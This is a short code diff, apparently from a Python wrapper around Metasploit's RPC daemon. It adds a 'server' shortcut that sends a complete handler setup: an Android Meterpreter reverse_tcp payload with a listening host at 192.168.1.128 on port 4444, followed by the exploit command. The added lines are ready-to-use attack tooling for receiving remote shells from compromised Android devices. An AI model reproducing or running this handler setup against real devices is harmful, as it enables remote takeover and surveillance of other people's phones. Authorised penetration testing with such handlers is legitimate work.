@@ -157,6 +157,8 @@ class Main:
             if command == "quit":
                 self.msfconsole.disconnect()
                 sys.exit()
+            if command == "server":
+                command = "use exploit/multi/handler\nset payload android/meterpreter/reverse_tcp\nset lhost 192.168.1.128\nset lport 4444\nexploit"
             # If command not empty send it to msfrpcd
             if command:
                 self.msfconsole.exec_command(command)
